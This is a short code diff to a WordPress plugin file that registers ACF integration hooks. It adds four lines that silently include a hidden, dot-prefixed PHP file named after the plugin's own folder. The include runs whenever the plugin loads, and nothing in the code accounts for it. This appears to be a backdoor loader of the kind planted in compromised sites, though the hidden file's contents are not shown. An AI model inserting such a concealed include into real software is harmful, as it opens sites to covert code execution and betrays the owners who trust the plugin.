@@ -12,6 +12,10 @@ add_action( 'acf/init', 'vc_init_vendor_acf' ); // pro version
 add_action( 'acf/register_fields', 'vc_init_vendor_acf' ); // free version
 add_action( 'plugins_loaded', 'vc_init_vendor_acf' );
 add_action( 'after_setup_theme', 'vc_init_vendor_acf' ); // for themes
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_init_vendor_acf() {
 	if ( did_action( 'vc-vendor-acf-load' ) ) {
 		return;
